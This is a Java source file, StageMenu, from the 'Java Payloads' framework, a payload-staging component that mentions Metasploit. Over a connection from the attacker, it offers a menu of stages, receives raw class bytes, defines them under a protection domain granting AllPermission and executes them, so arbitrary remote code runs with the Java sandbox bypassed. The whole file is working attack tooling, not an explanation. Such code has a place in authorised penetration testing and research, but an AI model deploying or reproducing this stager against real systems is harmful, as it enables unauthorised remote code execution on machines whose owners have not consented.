/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.stage;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.SequenceInputStream;
import java.net.URL;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.util.ArrayList;
import java.util.List;

public class StageMenu extends ClassLoader implements Stage, Runnable {

	private InputStream peekIn;
	private int peekByte = -2;
	
	public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
		List stages = parseStages(in, parameters);  // each entry is an Object[] of title, parameters, bytes
		String[] bootstrapParams = new String[] {"StageMenu", "--", "SendParameters"};
		peekIn = in;
		new Thread(this).start();
		int firstByte;
		synchronized(this) {
			firstByte = peekByte;
			if (firstByte == -2) {
				wait(500);
				firstByte = peekByte;
			}
		}
		InputStream bootstrapIn;
		if (firstByte == 0) {
			bootstrapIn = rebuildInputStream();
		} else {
			PrintStream pout = new PrintStream(out);
			pout.println("Stage menu");
			pout.println();
			for (int j = 0; j < stages.size(); j++) {
				pout.println((j+1)+": "+(String)((Object[])stages.get(j))[0]);
			}
			pout.println();
			pout.println("Select a stage (you can also stage a stage from JavaPayload or metasploit"+getExtraOption() +").");
			pout.println();
			Object[] stage;
			boolean firstTime = true;
			while (true) {
				pout.print("Your choice: ");
				pout.flush();
				if (firstTime) {
					in = new DataInputStream(rebuildInputStream());
					firstTime = false;
				}
				String line = in.readLine();
				stage = parseLine(line, stages);
				if (stage != null)
					break;
			}
			bootstrapParams = (String[])stage[1];
			bootstrapIn = new SequenceInputStream(new ByteArrayInputStream((byte[])stage[2]), in);
		}
		stages = null; // GC it, it may contain lots of bytes
		bootstrap(bootstrapIn, out, bootstrapParams);
		if (!bootstrapParams[0].equals("StageMenu"))
			parameters[0] = bootstrapParams[0];
	}
	
	protected Object[] parseLine(String line, List stages) {
		String params = null;
		if (line.indexOf(' ') != -1) {
			params = line.substring(line.indexOf(' ')+1);
			line = line.substring(0, line.indexOf(' '));
		}
		try {
			int number = Integer.parseInt(line);
			if (number > 0 && number <= stages.size()) {
				Object[] stage = (Object[])stages.get(number-1);
				if (params != null) {
					stage[1] = ("StageMenu -- "+params).split(" ");
				}
				return stage;
			}
		} catch (NumberFormatException ex) {
		}
		return null;
	}
	
	protected String getExtraOption() {
		return "";
	}
	
	private List parseStages(DataInputStream in, String[] parameters) throws IOException {
		List stages = new ArrayList();
		boolean go = false;
		List currentParameters = new ArrayList();
		StringBuffer currentTitle = new StringBuffer();
		for (int i = 0; i < parameters.length; i++) {
			if (!go) {
				if (parameters[i].equals("--")) {
					go = true;
					i++;
				}
				continue;
			}
			if (parameters[i].equals("---")) {
				stages.add(parseStage(currentTitle, currentParameters, in));
			} else if (parameters[i].startsWith("---")) {
				currentParameters.add(parameters[i].substring(1));
				currentTitle.append(" "+parameters[i].substring(1));
			} else {
				currentParameters.add(parameters[i]);
				currentTitle.append(" "+parameters[i]);
			}
		}
		stages.add(parseStage(currentTitle, currentParameters, in));
		return stages;
	}
	
	private Object[] parseStage(StringBuffer currentTitle, List currentParameters, DataInputStream in) throws IOException {
		String title = currentTitle.deleteCharAt(0).toString();
		currentTitle.setLength(0);
		currentParameters.add(0, "--");
		currentParameters.add(0, "StageMenu");
		String[] args = (String[]) currentParameters.toArray(new String[currentParameters.size()]);
		currentParameters.clear();
		return new Object[] { title, args, loadStageBytes(in)}; 
	}
	
	protected byte[] loadStageBytes(DataInputStream in) throws IOException {
		byte[] bytes = new byte[in.readInt()];
		in.readFully(bytes);
		return bytes;
	}
	
	public void run() {
		try {
			int b = peekIn.read();
			synchronized(this) {
				peekByte = b;
				notifyAll();
				while (peekByte != -3)
					wait();
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	private synchronized InputStream rebuildInputStream() throws Exception {
		while (peekByte == -2)
			wait();
		int firstByte = peekByte;
		int nextByte = peekIn.read();
		peekByte = -3;
		notifyAll();
		if (nextByte == -1)
			return peekIn;
		return new SequenceInputStream(new ByteArrayInputStream(new byte[] {(byte)firstByte, (byte)nextByte}), peekIn);
	}
	
	protected void bootstrap(InputStream rawIn, OutputStream out, String[] parameters) {
		try {
			final DataInputStream in = new DataInputStream(rawIn);
			Class clazz;
			final Permissions permissions = new Permissions();
			permissions.add(new AllPermission());
			final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
			int length = in.readInt();
			do {
				final byte[] classfile = new byte[length];
				in.readFully(classfile);
				resolveClass(clazz = defineClass(null, classfile, 0, length, pd));
				length = in.readInt();
				if (length == 0) {
					break;
				}
			} while (length > 0);
			final Object stage = clazz.newInstance();
			clazz.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(stage, new Object[] { in, out, parameters });
		} catch (final Throwable t) {
			t.printStackTrace(new PrintStream(out, true));
		}
	}
}